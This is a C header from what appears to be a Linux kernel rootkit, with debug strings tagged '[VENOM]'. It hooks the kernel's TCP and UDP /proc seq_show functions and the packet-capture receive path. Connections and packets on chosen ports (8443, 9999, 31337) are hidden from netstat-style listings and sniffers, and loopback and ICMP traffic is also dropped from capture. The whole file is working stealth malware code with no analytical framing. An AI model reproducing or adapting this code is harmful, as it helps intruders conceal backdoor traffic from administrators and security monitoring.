#ifndef NETWORK_H
#define NETWORK_H

#include "../include/headers.h"


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                               struct packet_type *pt, struct net_device *orig_dev);


static int g_hidden_port = 8443;
static char **g_hidden_ips = NULL;
static int g_hidden_ports[10] = {8443, 9999, 31337, 0}; 

void set_hidden_port(int port) {
    g_hidden_port = port;
    g_hidden_ports[0] = port;
}

void set_hidden_ips(char **ips) {
    g_hidden_ips = ips;
}


notrace static int is_port_hidden(int port) {
    int i;
    for (i = 0; i < 10 && g_hidden_ports[i] != 0; i++) {
        if (g_hidden_ports[i] == port) {
            return 1;
        }
    }
    return 0;
}


notrace static int is_ip_hidden(const char *ip) {
    int i;
    if (!ip || !g_hidden_ips) {
        return 0;
    }
    
    for (i = 0; g_hidden_ips[i] != NULL; i++) {
        if (strstr(ip, g_hidden_ips[i])) {
            return 1;
        }
    }
    return 0;
}


notrace static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk == (struct sock *)0x1) {
        return orig_tcp4_seq_show(seq, v);
    }
    
    if (sk && is_port_hidden(sk->sk_num)) {
        // printk(KERN_DEBUG "[VENOM] Hiding TCP4 connection on port %d\n", sk->sk_num);
        return 0; 
    }
    
    return orig_tcp4_seq_show(seq, v);
}

notrace static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk == (struct sock *)0x1) {
        return orig_tcp6_seq_show(seq, v);
    }
    
    if (sk && is_port_hidden(sk->sk_num)) {
        // printk(KERN_DEBUG "[VENOM] Hiding TCP6 connection on port %d\n", sk->sk_num);
        return 0;
    }
    
    return orig_tcp6_seq_show(seq, v);
}


notrace static asmlinkage long hooked_udp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk == (struct sock *)0x1) {
        return orig_udp4_seq_show(seq, v);
    }
    
    if (sk && is_port_hidden(sk->sk_num)) {
        // printk(KERN_DEBUG "[VENOM] Hiding UDP4 connection on port %d\n", sk->sk_num);
        return 0;
    }
    
    return orig_udp4_seq_show(seq, v);
}


static asmlinkage long hooked_udp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk == (struct sock *)0x1) {
        return orig_udp6_seq_show(seq, v);
    }
    
    if (sk && is_port_hidden(sk->sk_num)) {
        // printk(KERN_DEBUG "[VENOM] Hiding UDP6 connection on port %d\n", sk->sk_num);
        return 0;
    }
    
    return orig_udp6_seq_show(seq, v);
}

static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                             struct packet_type *pt, struct net_device *orig_dev) {
    struct iphdr *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr *tcph;
    struct udphdr *udph;
    

    if (!strncmp(dev->name, "lo", 2)) {
        return NET_RX_DROP;
    }
    
    if (skb_linearize(skb)) {
        goto out;
    }

    if (skb->protocol == htons(ETH_P_IP)) {
        iph = ip_hdr(skb);
        
        if (iph->protocol == IPPROTO_TCP) {
            tcph = (void *)iph + iph->ihl * 4;
            if (is_port_hidden(ntohs(tcph->dest)) || 
                is_port_hidden(ntohs(tcph->source))) {
                // printk(KERN_DEBUG "[VENOM] Dropping TCP packet on hidden port\n");
                return NET_RX_DROP;
            }
        } 
        else if (iph->protocol == IPPROTO_UDP) {
            udph = (void *)iph + iph->ihl * 4;
            if (is_port_hidden(ntohs(udph->dest)) || 
                is_port_hidden(ntohs(udph->source))) {
                // printk(KERN_DEBUG "[VENOM] Dropping UDP packet on hidden port\n");
                return NET_RX_DROP;
            }
        }
        else if (iph->protocol == IPPROTO_ICMP) {
            return NET_RX_DROP;
        }
    } 

    else if (skb->protocol == htons(ETH_P_IPV6)) {
        ip6h = ipv6_hdr(skb);
        
        if (ip6h->nexthdr == IPPROTO_TCP) {
            tcph = (void *)ip6h + sizeof(*ip6h);
            if (is_port_hidden(ntohs(tcph->dest)) || 
                is_port_hidden(ntohs(tcph->source))) {
                return NET_RX_DROP;
            }
        } 
        else if (ip6h->nexthdr == IPPROTO_UDP) {
            udph = (void *)ip6h + sizeof(*ip6h);
            if (is_port_hidden(ntohs(udph->dest)) || 
                is_port_hidden(ntohs(udph->source))) {
                return NET_RX_DROP;
            }
        }
        else if (ip6h->nexthdr == IPPROTO_ICMPV6) {
            return NET_RX_DROP;
        }
    }

out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

#endif 
